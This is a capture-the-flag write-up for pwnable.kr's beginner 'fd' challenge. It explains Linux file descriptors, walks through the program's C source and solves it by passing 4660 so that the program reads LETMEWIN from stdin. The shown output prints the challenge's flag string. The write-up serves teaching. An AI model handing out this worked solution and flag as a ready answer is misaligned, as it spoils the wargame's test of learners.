# welcome

## Description

fd - 1pt

> Mommy! what is a file descriptor in Linux? <br> <br>
> try to play the wargame your self but if you are ABSOLUTE
> beginner, follow this tutorial link:
> https://youtu.be/971eZhMHQQw <br> <br>
> ssh fd@pwnable.kr -p2222 (pw:guest)

## Solution

### Background

#### File Descriptors

File descriptors are process-specific non-negative integers that are used to refer to files and other input/output resources. Each process has three file descriptors open by default:

* 0 - stdin
* 1 - stdout
* 2 - stderr

In order to read from an input source, we can use the ```read``` function:

```c
ssize_t read(int fd, void *buf, size_t count);
```

where ```fd``` is the file descriptor of the input source, ```buf``` is a pointer to a buffer, and ```count``` is the number of bytes to read.


### Exploit

When connecting to the server, we first check who are we:

```bash 
$ id
uid=1000(fd) gid=1000(fd) groups=1000(fd)
```

Then, we check the avialable files:

```bash
$ ls -l
total 16
-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd
-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c
-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag
```

It looks like we have a binary file, a source code file, and a flag file. We cannot read the flag file, but we can read the source code and execute the binary file. Let's take a look at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

It looks like the program expects a number as a command-line argument, and then it reads 32 bytes from the file descriptor ```fd```. If the input is equal to ```LETMEWIN```, then the program prints the flag. Otherwise, it prints a message.

The file descriptor ```fd``` is calculated as ```atoi(argv[1]) - 0x1234```. This means that if we pass ```0x1234``` as a command-line argument, then ```fd``` will be ```0```. This means that the program will read from ```stdin```. Let's try it:

```bash
$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

